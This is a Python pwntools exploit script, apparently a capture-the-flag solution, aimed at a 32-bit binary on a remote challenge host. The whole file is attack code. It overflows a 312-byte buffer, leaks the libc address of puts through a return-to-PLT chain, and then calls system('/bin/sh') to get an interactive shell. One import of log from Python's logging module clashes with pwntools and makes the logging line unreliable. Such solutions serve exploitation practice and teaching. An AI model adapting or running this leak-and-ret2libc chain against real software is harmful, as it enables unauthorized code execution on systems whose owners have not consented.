from logging import log

from pwn import *             

HOST="chall.v1t.site:30212"
ADDRESS,PORT=HOST.split(":")

elf = context.binary = ELF('./chall', checksec=False)

libc  = ELF('./libc.so.6', checksec=False)
if args.REMOTE:
    p = remote(ADDRESS,PORT)
else:
    p = process()    

offset = 312

payload = b'A' * offset
payload += p32(elf.plt.puts)
payload += p32(elf.sym.main)
payload += p32(elf.got.puts)
p.sendlineafter(b'here!',payload)
recv = p.recvuntil(b'Feather Maker').split(b'\n')[1]
leak = u32(recv)
log.info(f"puts leak: {hex(leak)}")
libc.address = leak - libc.sym.puts

p.sendlineafter(b"here!", b"A"*312 + p32(libc.sym.system) + p32(0x0) + p32(next(libc.search(b"/bin/sh\x00"))))
p.interactive()
